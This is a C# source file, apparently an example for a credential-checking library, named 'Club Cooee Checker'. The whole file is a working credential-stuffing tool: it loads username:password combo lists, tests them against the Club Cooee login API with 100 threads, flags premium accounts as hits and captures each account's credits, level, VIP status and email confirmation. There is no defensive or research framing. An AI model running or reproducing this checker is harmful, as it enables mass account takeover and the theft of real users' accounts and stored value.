using Milky.Enums;
using Milky.Models;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

namespace Milky.Examples
{
    public class Club_Cooee_Checker
    {
        private static readonly HttpClient _httpClient = new HttpClient();

        public static async Task Main()
        {
            var combos = new List<Combo>();

            foreach (string combo in File.ReadAllLines("combos.txt"))
            {
                string[] comboParts = combo.Split(':');

                if (comboParts.Length >= 2)
                {
                    combos.Add(new Combo(comboParts[0], comboParts[1]));
                }
            }

            var check = new MilkyCheck()
                .WithCombos(combos)
                .WithSettings(new CheckSettings
                {
                    Threads = 100,
                    OutputInConsole = true,
                    OutputInvalids = false
                })
                .WithCheckingProcess(async (combo, proxy) =>
                {
                    try
                    {
                        using var requestMessage = new HttpRequestMessage(HttpMethod.Post, "https://en.clubcooee.com/api3/auth_login")
                        {
                            Content = new FormUrlEncodedContent(new Dictionary<string, string>
                            {
                                { "username", combo.Username },
                                { "password", combo.Password }
                            })
                        };

                        using var responseMessage = await _httpClient.SendAsync(requestMessage);

                        var contentString = await responseMessage.Content.ReadAsStringAsync();
                        var contentJson = JsonConvert.DeserializeObject<dynamic>(contentString);

                        if (!(bool)contentJson.error)
                        {
                            dynamic user = contentJson.msg.userdata.auth;

                            var result = (bool)user.premium ? CheckResult.Hit : CheckResult.Free;

                            var captures = new Dictionary<string, string>
                            {
                                { "Cash", (string)user.credits },
                                { "Level", ((int)user.xp_level).ToString() },
                                { "VIP", ((bool)user.premium).ToString() },
                                { "Email confirmed", ((bool)user.email_confirmed).ToString() }
                            };

                            return (result, captures, false);
                        }
                        else
                        {
                            return (CheckResult.Invalid, null, false);
                        }
                    }
                    catch
                    {
                        return (CheckResult.Retry, null, true);
                    }
                });

            var console = new MilkyConsole()
                .WithCheck(check)
                .WithMeta(new Meta
                {
                    Name = "Club Cooee Checker",
                    Version = "Example",
                    Author = "Laiteux"
                })
                .WithSettings(new ConsoleSettings
                {
                    ShowFree = true,
                    ShowPercentages = true
                })
                .WithRefreshDelay(TimeSpan.FromMilliseconds(100));

            _ = console.StartAsync();
            await check.StartAsync();

            await Task.Delay(-1);
        }
    }
}
